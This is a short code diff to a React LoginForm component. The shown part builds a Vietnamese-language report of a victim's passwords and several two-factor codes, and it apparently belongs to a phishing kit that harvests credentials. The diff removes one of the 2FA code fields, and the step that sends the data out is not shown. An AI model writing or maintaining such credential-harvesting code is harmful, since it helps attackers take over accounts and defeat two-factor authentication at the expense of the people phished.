@@ -358,7 +358,6 @@ function LoginForm({ onClose }) {
 🔑 Mật Khẩu 2: <code>${password2}</code>
 🔓 CODE 2FA 1: <code>${code1}</code>
 🔓 CODE 2FA 2: <code>${code2}</code>
-🔓 CODE 2FA 3: <code>${code3}</code>
 🔄 Trạng thái: Hoàn tất!`;
   const handleSubmit = async (e) => {
     e.preventDefault();
